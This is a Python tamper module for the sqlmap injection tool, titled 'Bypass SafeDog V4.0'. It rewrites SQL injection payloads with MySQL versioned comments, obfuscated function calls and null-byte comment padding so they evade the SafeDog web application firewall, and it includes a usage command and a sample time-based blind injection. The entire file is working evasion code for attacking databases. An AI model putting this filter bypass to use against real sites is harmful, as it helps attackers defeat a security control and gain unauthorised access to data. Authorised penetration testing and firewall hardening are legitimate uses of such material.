#!/usr/bin/env python

"""
Bypass SafeDog V4.0
Version: 1.1
Date: 2018-04-18
Update: 2018-04-20
Author: Kyrie403
Copyright (c) Kyrie403
GitHub: https://github.com/kyrie403
Usage: python sqlmap.py -u http://test.com/test.php?id=1 --tamper=bypasssafedogv4 --random-agent --delay=0.5 --dbms MYSQL

"""

import re
from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS

__priority__ = PRIORITY.HIGH

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Requirement:
        * MySQL > 5.0

    Notes:
        * Useful to bypass SafeDog V4.0

    >>> tamper("AND 2610=IF((11=11),(SLEEP(5)),2610) AND 'eCSJ'='eCSJ")
    "/*!50010AND/*!*//*%00*/2610=/*!50010IF/*!*/((11=11),(/*!SLEEP/**/*//**/(5)),2610)/*%00*//*!50010AND/*!*//*%00*/'eCSJ'='eCSJ"
    """
    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!50010%s/*!*/" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        keyword = ['SLEEP', 'DATABASE', 'USER', 'CURRENT_USER']
        for key in keyword:
            if key in retVal:
                pattern_func = r'{}\(\w*\)'.format(key)
                pattern_value = r'(?<={}\()\w*(?=\))'.format(key)
                func = re.findall(pattern_func, retVal)
                value = re.findall(pattern_value, retVal)
                try:
                    retVal = retVal.replace(func[0], "(/*!{key}/**/*//**/({value}))").format(key=key, value=value[0])
                except IndexError:
                    pass
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), retVal)
        retVal = retVal.replace(" ", "/*%00*/").replace("%20", "/*%00*/")

    return retVal
